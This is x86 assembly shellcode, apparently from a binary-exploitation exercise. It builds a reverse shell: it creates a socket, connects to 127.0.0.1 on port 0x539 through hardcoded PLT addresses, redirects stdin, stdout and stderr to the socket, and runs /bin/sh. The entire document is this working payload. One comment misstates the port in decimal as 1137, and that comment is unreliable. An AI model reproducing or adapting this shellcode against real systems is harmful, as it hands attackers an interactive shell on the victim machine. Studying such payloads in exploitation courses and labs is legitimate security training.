sub esp, 1000 /* Was needed in this question otherwise the bug was we override the shellcode itself! */

/* prologue */
push ebp
mov ebp, esp

sub esp, 0x24
mov    DWORD PTR [ebp-0x1c],0x0
mov    DWORD PTR [ebp-0x18],0x0
mov    DWORD PTR [ebp-0x14],0x0
mov    DWORD PTR [ebp-0x10],0x0
sub esp, 0x04
push 0x0 /* This is the last argument passed to soeckt call */
push 0x1 /* This is SOCK_STREAM value */
push 0x2 /* This is AF_INET value */ 

mov edx, 0x08048730 /* address of socket@plt */
call edx 

add esp, 0x10
mov    DWORD PTR [ebp-0xc],eax
mov    WORD PTR [ebp-0x1c],0x2
sub    esp,0xc
push   0x539
/* This is the value of PORT number 1137 in decimal = 0x539 in hex */

mov edx, 0x08048640 /* address of htons@plt */
call   edx 

add    esp,0x10
mov    WORD PTR [ebp-0x1a],ax
sub    esp,0xc

JMP _WANT_IP_ADD
_GOT_IP_ADD:
/* now we have on top of the stack the pointer to the string 127.0.0.1 */
mov edx, 0x08048740 /* address of inet_addr@plt */
call edx

add    esp,0x10
mov    DWORD PTR [ebp-0x18],eax
sub    esp,0x4
push   0x10
lea    eax,[ebp-0x1c]
push   eax
push   DWORD PTR [ebp-0xc]

mov edx, 0x08048750 /* address of connect@plt */
call edx

add    esp,0x10
sub    esp,0x8
push   0x0 /* Argument to first dup2 call - stdin */
push   DWORD PTR [ebp-0xc]

mov edx, 0x08048600 /* address of dup2@plt */
call edx

add    esp,0x10
sub    esp,0x8
push   0x1 /* Argument to second dup2 call - stdout */
push   DWORD PTR [ebp-0xc]

mov edx, 0x08048600 /* address of dup2@plt */
call edx

add    esp,0x10
sub    esp,0x8
push   0x2 /* Argument to third dup2 call - sterr */
push   DWORD PTR [ebp-0xc]

mov edx, 0x08048600 /* address of dup2@plt */
call edx

add    esp,0x10
mov    DWORD PTR [ebp-0x20],0x0
sub    esp,0x8
lea    eax,[ebp-0x20]
push   eax

JMP _WANT_BIN_BASH
_GOT_BIN_BASH:
/* now we have on top of the stack the pointer to the string /bin/sh */

mov edx, 0x080486d0 /* address of execv@plt */
call edx

_WANT_IP_ADD:

CALL _GOT_IP_ADD
.STRING "127.0.0.1"

_WANT_BIN_BASH:

CALL _GOT_BIN_BASH
.STRING "/bin/sh"